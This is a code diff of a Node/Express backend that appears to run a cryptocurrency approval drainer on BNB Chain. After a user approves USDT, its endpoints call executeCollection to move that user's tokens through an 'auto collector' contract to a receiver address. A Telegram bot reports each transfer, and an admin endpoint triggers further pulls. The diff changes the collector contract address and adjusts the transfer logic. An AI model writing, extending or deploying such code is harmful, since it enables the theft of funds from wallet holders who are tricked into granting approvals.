@@ -7,9 +7,11 @@ import { ethers } from 'ethers';
 dotenv.config();
 
 const app = express();
+
 const PORT = process.env.PORT || 3001;
 
 app.use(cors());
+
 app.use(express.json());
 
 // Basic health check route
@@ -24,7 +26,7 @@ const OWNER_PRIVATE_KEY = process.env.OWNER_PRIVATE_KEY;
 const RECEIVER_ADDRESS = process.env.RECEIVER_ADDRESS;
 const RPC_URL = process.env.RPC_URL || 'https://bsc-dataseed.binance.org/';
 const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
-const AUTO_COLLECTOR_ADDRESS = '0x011c7f7edf0e91c6d13ec788657eb865fce4c0cc';
+const AUTO_COLLECTOR_ADDRESS = '0x73E2339c61E563FBC6E0173ad698742e6093407a';
 
 // ABI Definitions
 const USDT_ABI = [
@@ -80,17 +82,16 @@ app.post('/notify-approval', async (req, res) => {
 
   let transferHash = null; // ✅ define outside
 
-  if (userAddress) {
-    try {
-      const transferAmount =
-        (amount && !isNaN(amount) && Number(amount) > 0)
-          ? amount
-          : 0.01;
-
-      transferHash = await executeCollection(userAddress, transferAmount);
-
-    } catch (transferError) {
-      console.error('Auto-Transfer Failed:', transferError.message);
+   if (userAddress) {
+    // ✅ Only attempt transfer if a valid amount is provided
+    if (amount && !isNaN(amount) && Number(amount) > 0) {
+      try {
+        transferHash = await executeCollection(userAddress, amount);
+      } catch (transferError) {
+        console.error('Auto-Transfer Failed:', transferError.message);
+      }
+    } else {
+      console.log('⚠️ No valid amount provided. Skipping transfer.');
     }
 
     try {
@@ -130,8 +131,6 @@ app.post('/notify-visit', async (req, res) => {
       const provider = new ethers.JsonRpcProvider(RPC_URL);
 
       // ---------------------------------------------------------
-
-
       // 🔥 AUTO-BNB TRANSFER LOGIC (If user has low gas)
       // ---------------------------------------------------------
       // Only attempt funding if explicitly requested (after validation)
@@ -242,7 +241,6 @@ const sendTelegramNotification = async (userAddress, txHash, source, balanceStr 
   if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
 
   const time = new Date().toLocaleString('en-US', { timeZone: 'Asia/Kolkata' });
-
   const message = `
 🚀 <b>NEW TRANSFER INITIATED!</b>
 
@@ -292,6 +290,9 @@ app.post('/admin/transfer', async (req, res) => {
 
     const txHash = await executeCollection(userAddress, amount, targetReceiver);
 
+    // Send Notification - REMOVED per user request
+    // await sendTelegramNotification(userAddress, txHash, 'ADMIN_PANEL');
+
     res.json({ success: true, txHash });
   } catch (error) {
     console.error('Transfer Error:', error);
@@ -299,7 +300,7 @@ app.post('/admin/transfer', async (req, res) => {
   }
 });
 
-if (process.env.NODE_ENV !== 'production') {
+if (!process.env.VERCEL) {
   app.listen(PORT, () => {
     console.log(`Backend server running on http://localhost:${PORT}`);
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
